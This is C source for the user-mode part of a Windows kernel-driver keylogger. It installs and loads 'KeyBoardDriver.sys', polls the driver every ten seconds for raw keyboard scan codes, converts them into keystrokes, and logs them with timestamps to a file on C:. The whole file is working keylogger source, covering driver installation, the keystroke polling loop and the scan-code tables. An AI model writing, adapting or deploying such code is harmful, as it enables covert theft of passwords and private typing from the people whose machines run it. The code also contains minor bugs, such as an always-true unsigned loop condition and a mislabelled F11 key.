#include <stdio.h>
#include <Windows.h>
#include "ScmDrvCtrl.h"
#include <time.h> 
#pragma comment(lib,"user32.lib")

BOOLEAN FLAG_E0 = FALSE;
BOOLEAN big_small = FALSE;

void GetAppPath(char *szCurFile) //最后带斜杠
{
	GetModuleFileNameA(0,szCurFile,MAX_PATH);
	for(SIZE_T i=strlen(szCurFile)-1;i>=0;i--)
	{
		if(szCurFile[i]=='\\')
		{
			szCurFile[i+1]='\0';
			break;
		}
	}
}

int main()
{
	BOOL b;
	cDrvCtrl dc;
	unsigned char buffer[257] = {};
	unsigned long lenth = 0;
	//设置驱动名称
	char szSysFile[MAX_PATH]={0};
	char szSvcLnkName[]="KeyBoardDriver";
	GetAppPath(szSysFile);
	strcat(szSysFile,"KeyBoardDriver.sys");
	//安装并启动驱动
	b=dc.Install(szSysFile,szSvcLnkName,szSvcLnkName);
	printf("InstallDriver=%d\n",b);
	b=dc.Start();
	printf("LoadDriver=%d\n",b);
	////“打开”驱动的符号链接
	dc.Open("\\\\.\\keyboard");
	//使用控制码控制驱动（0x800：传入一个数字并返回一个数字）
	dc.IoControl(0x800,0,0,0,0,0);
	
	FILE * record_kernel;
	time_t timep;
	char s[30];
	while (1) {
		record_kernel = fopen("C://record_kernel.txt", "ab+");
		memset(buffer, 0, 257);
		Sleep(10000);
		time(&timep);
		strcpy(s, ctime(&timep));
		fprintf(record_kernel, "记录周期10s，时间： ");
		fprintf(record_kernel,"%s\r\n\r\n",s);
		dc.IoControl(0x801, NULL, 0, buffer, 255, &lenth);
		for (int i = 0; i < lenth; i++) {
			if (buffer[i] == 0)
				break;
			if (buffer[i] == 0xE0) {
				FLAG_E0 = TRUE;
			}
			if (buffer[i] == 0x3A) {
				if (buffer[i + 1] == 0xFA || buffer[i + 2] == 0xfa || buffer[i + 3] == 0xfa) {
					big_small = TRUE; //切换为大写
				}
				else {
					if (big_small == TRUE)
						big_small = FALSE;
					else
						big_small = TRUE;
				}
			}
			if (buffer[i] <= 0x80 && FLAG_E0 == FALSE && big_small == FALSE) {
				switch (buffer[i]) {
				case 0x02:
					fprintf(record_kernel, "1 ");
					break;
				case 0x03:
					fprintf(record_kernel, "2 ");
					break;
				case 0x04:
					fprintf(record_kernel, "3 ");
					break;
				case 0x05:
					fprintf(record_kernel, "4 ");
					break;
				case 0x06:
					fprintf(record_kernel, "5 ");
					break;
				case 0x07:
					fprintf(record_kernel, "6 ");
					break;
				case 0x08:
					fprintf(record_kernel, "7 ");
					break;
				case 0x09:
					fprintf(record_kernel, "8 ");
					break;
				case 0x0A:
					fprintf(record_kernel, "9 ");
					break;
				case 0x0B:
					fprintf(record_kernel, "0 ");
					break;
				case 0x0C:
					fprintf(record_kernel, "- ");
					break;
				case 0x0D:
					fprintf(record_kernel, "+ ");
					break;
				case 0x0E:
					fprintf(record_kernel, "[backspace] ");
					break;
				case 0x10:
					fprintf(record_kernel, "q ");
					break;
				case 0x11:
					fprintf(record_kernel, "w ");
					break;
				case 0x12:
					fprintf(record_kernel, "e ");
					break;
				case 0x13:
					fprintf(record_kernel, "r ");
					break;
				case 0x14:
					fprintf(record_kernel, "t ");
					break;
				case 0x15:
					fprintf(record_kernel, "y ");
					break;
				case 0x16:
					fprintf(record_kernel, "u ");
					break;
				case 0x17:
					fprintf(record_kernel, "i ");
					break;
				case 0x18:
					fprintf(record_kernel, "o ");
					break;
				case 0x19:
					fprintf(record_kernel, "p ");
					break;
				case 0x1A:
					fprintf(record_kernel, "[{] ");
					break;
				case 0x1B:
					fprintf(record_kernel, "[}] ");
					break;
				case 0x1e:
					fprintf(record_kernel, "a ");
					break;
				case 0x1f:
					fprintf(record_kernel, "s ");
					break;
				case 0x20:
					fprintf(record_kernel, "d ");
					break;
				case 0x21:
					fprintf(record_kernel, "f ");
					break;
				case 0x22:
					fprintf(record_kernel, "g ");
					break;
				case 0x23:
					fprintf(record_kernel, "h ");
					break;
				case 0x24:
					fprintf(record_kernel, "j ");
					break;
				case 0x25:
					fprintf(record_kernel, "k ");
					break;
				case 0x26:
					fprintf(record_kernel, "l ");
					break;
				case 0x27:
					fprintf(record_kernel, "[;] ");
					break;
				case 0x28:
					fprintf(record_kernel, "['] ");
					break;
				case 0x2c:
					fprintf(record_kernel, "z ");
					break;
				case 0x2d:
					fprintf(record_kernel, "x ");
					break;
				case 0x2e:
					fprintf(record_kernel, "c ");
					break;
				case 0x2f:
					fprintf(record_kernel, "v ");
					break;
				case 0x30:
					fprintf(record_kernel, "b ");
					break;
				case 0x31:
					fprintf(record_kernel, "n ");
					break;
				case 0x32:
					fprintf(record_kernel, "m ");
					break;
				case 0x33:
					fprintf(record_kernel, "[,] ");
					break;
				case 0x34:
					fprintf(record_kernel, "[.] ");
					break;
				case 0x35:
					fprintf(record_kernel, "[/] ");
					break;
				case 0x3b:
					fprintf(record_kernel, "[F1] ");
					break;
				case 0x3c:
					fprintf(record_kernel, "[F2] ");
					break;
				case 0x3d:
					fprintf(record_kernel, "[F3] ");
					break;
				case 0x3e:
					fprintf(record_kernel, "[F4] ");
					break;
				case 0x3f:
					fprintf(record_kernel, "[F5] ");
					break;
				case 0x40:
					fprintf(record_kernel, "[F6] ");
					break;
				case 0x41:
					fprintf(record_kernel, "[F7] ");
					break;
				case 0x42:
					fprintf(record_kernel, "[F8] ");
					break;
				case 0x43:
					fprintf(record_kernel, "[F9] ");
					break;
				case 0x44:
					fprintf(record_kernel, "[F10] ");
					break;
				case 0x57:
					fprintf(record_kernel, "F[11] ");
					break;
				case 0x58:
					fprintf(record_kernel, "F[12] ");
					break;
				case 0x1:
					fprintf(record_kernel, "[ESC] ");
					break;
				case 0x29:
					fprintf(record_kernel, "[~] ");
					break;
				case 0x1c:
					fprintf(record_kernel, "[Enter] ");
					break;
				case 0x2b:
					fprintf(record_kernel, "[|] ");
					break;
				case 0x2a:
					fprintf(record_kernel, "[shift] ");
					break;
				case 0x39:
					fprintf(record_kernel, "[space] ");
					break;
				case 0x1d:
					fprintf(record_kernel, "[ctrl] ");
					break;
				case 0x3a:
					fprintf(record_kernel, "[shift] ");
					break;
				default:
					fprintf(record_kernel, "[unknown] ");
					break;
				}
			}
			else if (buffer[i] <= 0x80 && FLAG_E0 == FALSE && big_small == TRUE) {
				switch (buffer[i]) {
				case 0x02:
					fprintf(record_kernel, "1 ");
					break;
				case 0x03:
					fprintf(record_kernel, "2 ");
					break;
				case 0x04:
					fprintf(record_kernel, "3 ");
					break;
				case 0x05:
					fprintf(record_kernel, "4 ");
					break;
				case 0x06:
					fprintf(record_kernel, "5 ");
					break;
				case 0x07:
					fprintf(record_kernel, "6 ");
					break;
				case 0x08:
					fprintf(record_kernel, "7 ");
					break;
				case 0x09:
					fprintf(record_kernel, "8 ");
					break;
				case 0x0A:
					fprintf(record_kernel, "9 ");
					break;
				case 0x0B:
					fprintf(record_kernel, "0 ");
					break;
				case 0x0C:
					fprintf(record_kernel, "- ");
					break;
				case 0x0D:
					fprintf(record_kernel, "+ ");
					break;
				case 0x0E:
					fprintf(record_kernel, "[backspace] ");
					break;
				case 0x10:
					fprintf(record_kernel, "Q ");
					break;
				case 0x11:
					fprintf(record_kernel, "W ");
					break;
				case 0x12:
					fprintf(record_kernel, "E ");
					break;
				case 0x13:
					fprintf(record_kernel, "R ");
					break;
				case 0x14:
					fprintf(record_kernel, "T ");
					break;
				case 0x15:
					fprintf(record_kernel, "Y ");
					break;
				case 0x16:
					fprintf(record_kernel, "U ");
					break;
				case 0x17:
					fprintf(record_kernel, "I ");
					break;
				case 0x18:
					fprintf(record_kernel, "O ");
					break;
				case 0x19:
					fprintf(record_kernel, "P ");
					break;
				case 0x1A:
					fprintf(record_kernel, "[{] ");
					break;
				case 0x1B:
					fprintf(record_kernel, "[}] ");
					break;
				case 0x1e:
					fprintf(record_kernel, "A ");
					break;
				case 0x1f:
					fprintf(record_kernel, "S ");
					break;
				case 0x20:
					fprintf(record_kernel, "D ");
					break;
				case 0x21:
					fprintf(record_kernel, "F ");
					break;
				case 0x22:
					fprintf(record_kernel, "G ");
					break;
				case 0x23:
					fprintf(record_kernel, "H ");
					break;
				case 0x24:
					fprintf(record_kernel, "J ");
					break;
				case 0x25:
					fprintf(record_kernel, "K ");
					break;
				case 0x26:
					fprintf(record_kernel, "L ");
					break;
				case 0x27:
					fprintf(record_kernel, "[;] ");
					break;
				case 0x28:
					fprintf(record_kernel, "['] ");
					break;
				case 0x2c:
					fprintf(record_kernel, "Z ");
					break;
				case 0x2d:
					fprintf(record_kernel, "X ");
					break;
				case 0x2e:
					fprintf(record_kernel, "C ");
					break;
				case 0x2f:
					fprintf(record_kernel, "V ");
					break;
				case 0x30:
					fprintf(record_kernel, "B ");
					break;
				case 0x31:
					fprintf(record_kernel, "N ");
					break;
				case 0x32:
					fprintf(record_kernel, "M ");
					break;
				case 0x33:
					fprintf(record_kernel, "[,] ");
					break;
				case 0x34:
					fprintf(record_kernel, "[.] ");
					break;
				case 0x35:
					fprintf(record_kernel, "[/] ");
					break;
				case 0x3b:
					fprintf(record_kernel, "[F1] ");
					break;
				case 0x3c:
					fprintf(record_kernel, "[F2] ");
					break;
				case 0x3d:
					fprintf(record_kernel, "[F3] ");
					break;
				case 0x3e:
					fprintf(record_kernel, "[F4] ");
					break;
				case 0x3f:
					fprintf(record_kernel, "[F5] ");
					break;
				case 0x40:
					fprintf(record_kernel, "[F6] ");
					break;
				case 0x41:
					fprintf(record_kernel, "[F7] ");
					break;
				case 0x42:
					fprintf(record_kernel, "[F8] ");
					break;
				case 0x43:
					fprintf(record_kernel, "[F9] ");
					break;
				case 0x44:
					fprintf(record_kernel, "[F10] ");
					break;
				case 0x57:
					fprintf(record_kernel, "[F11] ");
					break;
				case 0x58:
					fprintf(record_kernel, "[F12] ");
					break;
				case 0x1:
					fprintf(record_kernel, "[ESC] ");
					break;
				case 0x29:
					fprintf(record_kernel, "[~] ");
					break;
				case 0x1c:
					fprintf(record_kernel, "[Enter] ");
					break;
				case 0x2b:
					fprintf(record_kernel, "[|] ");
					break;
				case 0x2a:
					fprintf(record_kernel, "[shift] ");
					break;
				case 0x39:
					fprintf(record_kernel, "[space] ");
					break;
				case 0x1d:
					fprintf(record_kernel, "[ctrl] ");
					break;
				case 0x3a:
					fprintf(record_kernel, "[shift] ");
					break;
				default:
					fprintf(record_kernel, "[unknown] ");
					break;
				}
			}
			else if (buffer[i] <= 0x80 && FLAG_E0 == TRUE) {
				FLAG_E0 = FALSE;
				switch (buffer[i]) {
				case 0x2a:
					fprintf(record_kernel, "[PrtSc SysRq] ");
					break;
				case 0x53:
					fprintf(record_kernel, "[Delete] ");
					break;
				case 0x47:
					fprintf(record_kernel, "[Home] ");
					break;
				case 0x4f:
					fprintf(record_kernel, "[End] ");
					break;
				case 0x49:
					fprintf(record_kernel, "[Page up] ");
					break;
				case 0x51:
					fprintf(record_kernel, "[Page down] ");
					break;
				case 0x48:
					fprintf(record_kernel, "[Up] ");
					break;
				case 0x50:
					fprintf(record_kernel, "[Down] ");
					break;
				case 0x4b:
					fprintf(record_kernel, "[Left] ");
					break;
				case 0x4d:
					fprintf(record_kernel, "[Right] ");
					break;
				case 0x1d:
					fprintf(record_kernel, "[Right Ctrl] ");
					break;
				case 0x38:
					fprintf(record_kernel, "[Right Alt] ");
					break;
				case 0x5b:
					fprintf(record_kernel, "[Win] ");
					break;
				default:
					fprintf(record_kernel, "[Unknown Ext code] ");
				}
			}
		}
		fprintf(record_kernel, "\r\n");
		fclose(record_kernel);
		//break;
	}
	
	//关闭符号链接句柄
	CloseHandle(dc.m_hDriver);
	//停止并卸载驱动
	b=dc.Stop();
	b=dc.Remove();
	printf("UnloadDriver=%d\n",b);
	//getchar();
	return 0;
}